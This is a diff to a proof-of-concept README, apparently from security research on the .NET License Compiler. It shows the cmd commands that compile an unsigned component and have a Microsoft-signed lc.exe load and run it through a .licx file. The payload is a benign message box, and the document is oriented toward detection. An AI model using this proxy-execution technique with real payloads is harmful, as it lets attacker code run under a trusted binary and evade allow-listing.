@@ -27,23 +27,29 @@ persistence, networking, or child process was required.
 
 ## Message-box proof of concept
 
-Run from PowerShell:
+The PoC requires two source files:
 
-```powershell
-Set-Location .\lc\POC
-.\Test-LcMessageBox.ps1
+- [`MessageBoxComponent.cs`](POC/MessageBoxComponent.cs): component constructor
+  that displays the benign validation message.
+- [`messagebox.licx`](POC/messagebox.licx): identifies the component type and
+  the `LcMessageBox` assembly.
+
+Compile the component from `cmd.exe`. The output must be named
+`LcMessageBox.dll` to match the assembly name in `messagebox.licx`:
+
+```cmd
+"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /nologo /target:library /out:"<path-to-LcMessageBox.dll>" "<path-to-MessageBoxComponent.cs>"
 ```
 
-The script compiles [`MessageBoxComponent.cs`](POC/MessageBoxComponent.cs) with
-the 32-bit .NET Framework compiler, copies the `.licx` file and unsigned
-assembly into a new temporary directory, and invokes the installed 4.8.1
-`lc.exe`. Expected result: a dialog reports that `lc.exe` loaded the assembly
-and instantiated the component; dismissing it allows the license compilation
-to complete.
+Run the proof with the installed License Compiler:
 
-For a non-GUI control, run [`POC/Test-LcProxy.ps1`](POC/Test-LcProxy.ps1). It
-uses `CanaryComponent.cs` to write a harmless marker with the executing image,
-PID, and user.
+```cmd
+"C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8.1 Tools\lc.exe" /nologo /target:fake.exe /complist:"<path-to-messagebox.licx>" /outdir:"<writable-output-directory>" /i:"<path-to-LcMessageBox.dll>"
+```
+
+Expected result: a dialog reports that `lc.exe` loaded the unsigned assembly
+and instantiated the component. Dismissing it allows license compilation to
+complete.
 
 ## Detection opportunities
 
